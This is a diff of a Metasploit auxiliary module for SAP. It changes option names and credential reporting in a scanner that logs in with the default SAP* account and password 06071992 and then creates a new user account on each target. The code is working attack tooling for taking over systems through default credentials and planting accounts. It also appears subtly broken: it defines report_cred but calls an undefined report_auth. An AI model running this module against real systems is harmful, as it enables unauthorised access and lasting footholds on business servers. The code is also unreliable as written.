@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,10 +14,7 @@
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -43,13 +40,39 @@ class Metasploit4 < Msf::Auxiliary
     register_options([
       Opt::RPORT(8000),
       OptString.new('CLIENT', [true, 'SAP client', '001']),
-      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-      OptString.new('PASSWORD', [true, 'Password', '06071992']),
+      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+      OptString.new('HttpPassword', [true, 'Password', '06071992']),
       OptString.new('BAPI_FIRST',[true,'First name','John']),
       OptString.new('BAPI_LAST',[true,'Last name','Doe']),
       OptString.new('BAPI_PASSWORD',[true,'Password for the account (Default is msf1234)','msf1234']),
       OptString.new('BAPI_USER',[true,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
-      ], self.class)
+      ])
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def run_host(ip)
@@ -77,10 +100,11 @@ class Metasploit4 < Msf::Auxiliary
         'data' => data,
         'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
         'ctype' => 'text/xml; charset=UTF-8',
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'headers' => {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
         },
+        'encode_params' => false,
         'vars_get' => {
           'sap-client'    => datastore['CLIENT'],
           'sap-language'  => 'EN'
@@ -97,13 +121,13 @@ class Metasploit4 < Msf::Auxiliary
           return
         else
           print_good("[SAP] #{ip}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created")
-          report_auth_info(
-            :host => ip,
-            :port => rport,
-            :sname => "sap",
-            :user => "#{datastore['BAPI_USER']}",
-            :pass => "#{datastore['BAPI_PASSWORD']}",
-            :active => true
+          report_auth(
+            ip: ip,
+            port: rport,
+            service_name: 'sap',
+            user: datastore['BAPI_USER'],
+            password: datastore['BAPI_PASSWORD'],
+            proof: res.body
           )
           return
         end
